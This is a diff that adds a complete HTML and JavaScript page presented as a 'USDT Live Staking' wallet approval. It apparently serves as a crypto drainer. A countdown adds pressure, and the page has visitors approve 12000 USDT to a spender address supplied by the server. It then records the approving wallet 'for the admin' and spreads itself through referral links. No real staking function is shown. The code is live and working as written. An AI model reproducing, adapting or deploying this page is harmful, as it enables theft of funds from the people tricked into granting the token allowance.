@@ -1,0 +1,229 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>USDT Wallet Approval • BSC</title>
+<style>
+  :root{ --bg-0:#06080c; --bg-1:#0a0f19; --panel:#0d1324; --panel-2:#0f1530; --txt:#e7f1ff; --muted:#8ea2c6; --accent:#00df9a; --accent-2:#4af2c7; }
+  *{ box-sizing:border-box } html,body{ height:100% }
+  body{ margin:0; font-family: ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Helvetica,Arial; color:var(--txt);
+        background: radial-gradient(1000px 600px at -10% -10%, #0e1b3d 0%, transparent 60%),
+                    radial-gradient(1200px 700px at 110% 0%, #101c3e 0%, transparent 65%),
+                    linear-gradient(180deg, var(--bg-1), var(--bg-0)); }
+  .wrap{ max-width: 1200px; margin: 0 auto; padding: 0 18px 80px; }
+  .nav{ display:flex; align-items:center; justify-content:space-between; padding:18px 0 }
+  .brand{ font-weight:800; letter-spacing:.06em; font-size:18px }
+  .nav .right{ display:flex; gap:10px; align-items:center }
+  .btn{ padding:10px 14px; border-radius:12px; background:#141b36; color:var(--txt); border:1px solid #232a56; cursor:pointer }
+  .btn:hover{ filter:brightness(1.08) }
+  h1{ font-size: clamp(34px,6vw,58px); margin: 14px 0 8px; text-align:center; text-shadow: 0 10px 30px rgba(0,0,0,.4) }
+  .sub{ color: var(--muted); text-align:center; margin-bottom:6px }
+  .card{ margin:18px auto 0; max-width: 860px; background:linear-gradient(180deg,#0e1430,#0b1026); border:1px solid rgb(255 255 255 / .07); border-radius:24px; padding:24px; text-align:center; box-shadow: 0 30px 80px -40px rgba(0,0,0,.6) }
+  .pill{ background:#0b1228; border:1px solid rgb(255 255 255 / .08); color:#c7d2ee; border-radius:999px; padding:8px 12px; display:inline-block; margin:6px; font-size:14px }
+  .address{ font-family: ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,'Liberation Mono','Courier New',monospace; }
+
+  :root{
+    --h:205; --sat:96%;
+    --bg-top:hsl(var(--h) var(--sat) 78%);
+    --bg-mid:hsl(var(--h) var(--sat) 60%);
+    --bg-bot:hsl(var(--h) var(--sat) 45%);
+    --edge:hsl(var(--h) var(--sat) 34%);
+    --text:#fff;
+    --ring:hsl(var(--h) 95% 78%/.8);
+    --shadow:0 14px 28px -10px rgb(0 0 0/.32),0 8px 18px -10px rgb(0 0 0/.24);
+    --inner-shadow:inset 0 1px 0 rgb(255 255 255/.38),inset 0 -3px 12px rgb(0 0 0/.26);
+    --press-shadow:inset 0 4px 12px rgb(0 0 0/.28),inset 0 -1px 0 rgb(255 255 255/.18);
+    --radius:999px; --pad-y:16px; --pad-x:40px;
+  }
+  .button-3d{appearance:none;border:0;position:relative;padding:var(--pad-y) var(--pad-x);border-radius:var(--radius);color:var(--text);
+    font-weight:800;letter-spacing:.08em;text-transform:uppercase;font-size:clamp(15px,1.1vw + .35rem,20px);cursor:pointer;outline:none;
+    transform-style:preserve-3d;transition: transform .18s cubic-bezier(.2,.7,.3,1), filter .18s ease, box-shadow .18s ease;
+    background: linear-gradient(to bottom, rgb(255 255 255/.46), transparent 16%) padding-box,
+               radial-gradient(120% 140% at 50% 10%, rgb(255 255 255/.35), transparent 55%) padding-box,
+               linear-gradient(180deg, var(--bg-top), var(--bg-mid) 54%, var(--bg-bot)) border-box;
+    box-shadow: var(--shadow), inset 0 0 0 1px rgb(255 255 255/.55), inset 0 -2px 0 rgb(0 0 0/.12);
+    border: 1px solid hsl(var(--h) 75% 38%/.55); text-shadow: 0 1px 0 rgb(0 0 0/.35); }
+  .button-3d::before{content:"";position:absolute; inset:4px 6px auto 6px; height:58%; border-radius:inherit;
+    background: linear-gradient(to bottom, rgb(255 255 255/.95), rgb(255 255 255/.22)),
+               radial-gradient(120% 60% at 50% -10%, rgb(255 255 255/.75), transparent 60%);
+    filter: blur(.2px); mix-blend-mode:screen; pointer-events:none;}
+  .button-3d::after{content:""; position:absolute; inset:0; border-radius:inherit;
+    background: linear-gradient(115deg, transparent 35%, rgb(255 255 255/.82) 47%, transparent 59%),
+               radial-gradient(38px 22px at 26% 22%, rgb(255 255 255/.95), transparent 60%),
+               radial-gradient(60px 30px at 74% 18%, rgb(255 255 255/.38), transparent 60%);
+    transform:translateX(-130%) skewX(-18deg); opacity:.0; transition: transform .8s cubic-bezier(.2,.7,.3,1), opacity .2s ease; pointer-events:none;}
+  .button-3d .label{ position:relative; transform: translateZ(12px); }
+  .button-3d:hover{ transform: translateY(-1px) scale(1.01); filter: saturate(1.07) brightness(1.02); }
+  .button-3d:hover::after{ transform: translateX(130%) skewX(-18deg); opacity:.35; }
+  .button-3d:active{ transform: translateY(2px); box-shadow: 0 10px 20px -10px rgb(0 0 0/.22), 0 4px 10px -6px rgb(0 0 0/.18), var(--press-shadow);
+    background: linear-gradient(to bottom, rgb(255 255 255/.16), transparent 8%) padding-box, linear-gradient(180deg, var(--bg-mid), var(--bg-bot) 60%, var(--edge)) border-box; }
+  .button-3d:active::before{ opacity:.65 } .button-3d{ box-shadow: var(--shadow), var(--inner-shadow) }
+  .button-3d:focus-visible{ outline:0; box-shadow: 0 0 0 4px var(--ring), 0 12px 22px -10px rgb(0 0 0/.18) }
+  .is-lg{ --pad-y:18px; --pad-x:40px } .help{ color:#b6bbd2; font-size:13px; margin-top:12px }
+
+  /* Countdown */
+  .countdown{ max-width: 920px; margin:22px auto 8px; background:linear-gradient(180deg, #0d162c, #0b1226);
+    border:1px solid rgba(255,255,255,.06); border-radius:22px; padding:18px; box-shadow: 0 40px 100px -50px rgba(0,0,0,.6) }
+  .countdown .title{ text-align:center; font-size:14px; letter-spacing:.25em; color:#92b5d6; margin-bottom:14px }
+  .grid{ display:grid; grid-template-columns: repeat(4, minmax(140px,1fr)); gap:14px }
+  .tile{ background: radial-gradient(160px 90px at 50% -10%, #1b314d 0%, transparent 70%), linear-gradient(180deg,#0e1b2e,#0c1628);
+    border:1px solid rgba(255,255,255,.06); border-radius:20px; padding:22px 10px; text-align:center; position:relative; overflow:hidden }
+  .num{ font-size: clamp(26px,6vw,44px); font-weight:800; color:#a6ffde; text-shadow: 0 0 30px rgba(58,255,191,.3) }
+  .label{ color:#7fa0b9; font-size:12px; letter-spacing:.25em; margin-top:6px; text-transform:uppercase }
+  @media (max-width:720px){ .grid{ grid-template-columns: repeat(2,1fr) } }
+  footer{ margin:40px 0 0; padding:18px 0 34px; text-align:center; color:#8da4c6 }
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="nav">
+      <div class="brand">USDT Live Staking</div>
+      <div class="right">
+        <div id="refMini" style="display:none" class="btn"></div>
+        <button class="btn" id="loginBtn">Login</button>
+      </div>
+    </div>
+
+    <div class="countdown">
+      <div class="title">STAKING EVENT ENDS IN:</div>
+      <div class="grid">
+        <div class="tile"><div class="num" id="d">—</div><div class="label">Days</div></div>
+        <div class="tile"><div class="num" id="h">—</div><div class="label">Hours</div></div>
+        <div class="tile"><div class="num" id="m">—</div><div class="label">Minutes</div></div>
+        <div class="tile"><div class="num" id="s">—</div><div class="label">Seconds</div></div>
+      </div>
+    </div>
+
+    <h1>Wallet Approval</h1>
+    <p class="sub">Approve <strong id="amountLabel">12000</strong> USDT to the staking proxy on BNB Smart Chain.</p>
+
+    <div class="card">
+      <button class="button-3d is-lg" id="cta"><span class="label" id="ctaLabel">Connect Wallet</span></button>
+      <div style="margin-top:10px">
+        <span class="pill">Network: <span id="net">—</span></span>
+        <span class="pill">Account: <span class="address" id="acct">—</span></span>
+        <span class="pill">Allowance: <span id="allow">—</span></span>
+      </div>
+      <p class="help" id="help">You’ll be asked to switch to BSC if needed. After approval we’ll record your wallet for the admin.</p>
+    </div>
+
+    <div id="ref" class="card" style="display:none; margin-top:16px">
+      <div><strong>Your referral link</strong></div>
+      <div class="address" id="refLink" style="margin:8px 0"></div>
+      <div>Total referrals: <span id="refCount">0</span></div>
+    </div>
+
+    <footer>© <span id="y"></span> USDT Live Staking · <a href="" style="color:#a6b6ff">Liquidity</a></footer>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.umd.min.js"></script>
+  <script>
+  (async function(){
+    const cfgRes = await fetch('/api/config').then(r=>r.json());
+    const CFG = cfgRes.config;
+    const USDT = CFG.USDT_ADDR, SPENDER = CFG.PROXY_ADDR, CHAIN_HEX = CFG.CHAIN_ID_HEX, END = Number(CFG.STAKING_END_TS||0);
+    const DECIMALS = CFG.APPROVAL_DECIMALS, AMOUNT_STR = CFG.APPROVAL_AMOUNT;
+
+    // countdown
+    const d=document.getElementById('d'),h=document.getElementById('h'),m=document.getElementById('m'),s=document.getElementById('s');
+    function tick(){
+      const now = Math.floor(Date.now()/1000);
+      let t = Math.max(0, END - now);
+      const dd = Math.floor(t/86400); t -= dd*86400;
+      const hh = Math.floor(t/3600); t -= hh*3600;
+      const mm = Math.floor(t/60); t -= mm*60;
+      const ss = t;
+      d.textContent = dd; h.textContent = String(hh).padStart(2,'0'); m.textContent = String(mm).padStart(2,'0'); s.textContent = String(ss).padStart(2,'0');
+    }
+    tick(); setInterval(tick, 1000);
+    document.getElementById('y').textContent = new Date().getFullYear();
+
+    // store ?ref=CODE attribution
+    const url = new URL(location.href);
+    const paramRef = url.searchParams.get('ref');
+    if(paramRef){ localStorage.setItem('ref_attribution', paramRef); }
+
+    const cta = document.getElementById('cta'), ctaLabel = document.getElementById('ctaLabel');
+    const net = document.getElementById('net'), acct = document.getElementById('acct'), allowEl = document.getElementById('allow'), help = document.getElementById('help');
+    const amountLabel = document.getElementById('amountLabel');
+    amountLabel.textContent = AMOUNT_STR;
+
+    const abi = ["function approve(address spender,uint256 amount) external returns (bool)","function allowance(address owner,address spender) view returns (uint256)"];
+    let provider, signer, account, token;
+    function short(a){return a ? a.slice(0,6) + "…" + a.slice(-4) : "—";}
+    function fmtUnits(bi){ try{ return ethers.formatUnits(bi, DECIMALS);}catch{ return "0";} }
+
+    async function ensureProvider(){ if(!window.ethereum){ help.textContent="No wallet found."; throw new Error("no_provider"); } provider = new ethers.BrowserProvider(window.ethereum,"any"); return provider; }
+    async function ensureBSC(){
+      const current = await window.ethereum.request({ method: 'eth_chainId' });
+      if(current !== CHAIN_HEX){
+        try{ await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: CHAIN_HEX }] }); }
+        catch(err){
+          if(err.code === 4902){
+            await window.ethereum.request({ method:'wallet_addEthereumChain', params:[{ chainId: CHAIN_HEX, chainName:'BNB Smart Chain', nativeCurrency:{name:'BNB',symbol:'BNB',decimals:18}, rpcUrls:['https://bsc-dataseed.binance.org'], blockExplorerUrls:['https://bscscan.com'] }]});
+          } else { throw err; }
+        }
+      }
+      net.textContent = "BSC";
+    }
+    async function refreshAllowance(){ try{ const a = await token.allowance(account, SPENDER); const v = parseFloat(fmtUnits(a)); allowEl.textContent = v.toLocaleString(undefined,{maximumFractionDigits:4}) + " USDT"; }catch(e){} }
+    function showRef(info){
+      if(!info) return;
+      document.getElementById('ref').style.display='block';
+      const link=location.origin+'/?ref='+info.refCode;
+      document.getElementById('refLink').textContent = link;
+      document.getElementById('refCount').textContent = info.refCount ?? 0;
+      const mini=document.getElementById('refMini');
+      mini.style.display='inline-block';
+      mini.textContent = 'Ref: '+info.refCode+' ('+(info.refCount??0)+')';
+    }
+
+    // login with wallet (signature)
+    async function loginWithWallet(){
+      try{
+        if(!account){ await ensureProvider(); const accounts = await provider.send("eth_requestAccounts", []); account = ethers.getAddress(accounts[0]); }
+        const nonceRes = await fetch('/api/wlogin/nonce?address='+account).then(r=>r.json());
+        const message = nonceRes.message;
+        signer = await provider.getSigner();
+        const signature = await signer.signMessage(message);
+        const ver = await fetch('/api/wlogin/verify',{ method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ address: account, message, signature }) }).then(r=>r.json());
+        if(ver.ok){ showRef({ refCode: ver.refCode, refCount: ver.refCount }); document.getElementById('loginBtn').textContent='Logged In'; }
+      }catch(e){ console.log(e); }
+    }
+
+    // load /api/me if session exists
+    try{ const me = await fetch('/api/me').then(r=>r.json()); if(me.ok && me.loggedIn){ showRef(me); document.getElementById('loginBtn').textContent='Logged In'; } }catch{}
+
+    document.getElementById('loginBtn').addEventListener('click', loginWithWallet);
+
+    let connected = false;
+    cta.addEventListener('click', async ()=>{
+      try{
+        if(!connected){
+          await ensureProvider(); await ensureBSC();
+          const accounts = await provider.send("eth_requestAccounts", []);
+          signer = await provider.getSigner(); account = ethers.getAddress(accounts[0]);
+          token = new ethers.Contract(USDT, abi, signer);
+          acct.textContent = short(account);
+          ctaLabel.textContent = `Approve ${AMOUNT_STR} USDT`;
+          help.innerHTML = "Click the button again to submit the approval transaction.";
+          connected = true; await refreshAllowance();
+          await loginWithWallet();
+        }else{
+          const value = ethers.parseUnits(AMOUNT_STR, DECIMALS);
+          const tx = await token.approve(SPENDER, value);
+          help.textContent = "Waiting for confirmation…";
+          await tx.wait();
+          help.innerHTML = "<b>Approved!</b> We'll record your wallet for the admin.";
+          const useRef = localStorage.getItem('ref_attribution') || undefined;
+          try{ const resp = await fetch("/api/record-approval", { method:"POST", headers:{ "Content-Type":"application/json" }, body: JSON.stringify({ txHash: tx.hash, wallet: account, refCode: useRef }) }).then(r=>r.json()); if(resp?.myRef) showRef({ refCode: resp.myRef.code, refCount: resp.myRef.count }); }catch(e){}
+          await refreshAllowance();
+        }
+      }catch(err){ console.error(err); if(err && err.code===4001) help.textContent='User rejected.'; else help.textContent='Error. See console.'; }
+    });
+    if(window.ethereum){ window.ethereum.on?.('accountsChanged', ()=>location.reload()); window.ethereum.on?.('chainChanged', ()=>location.reload()); }
+  })();
+  </script>
+</body>
+</html>
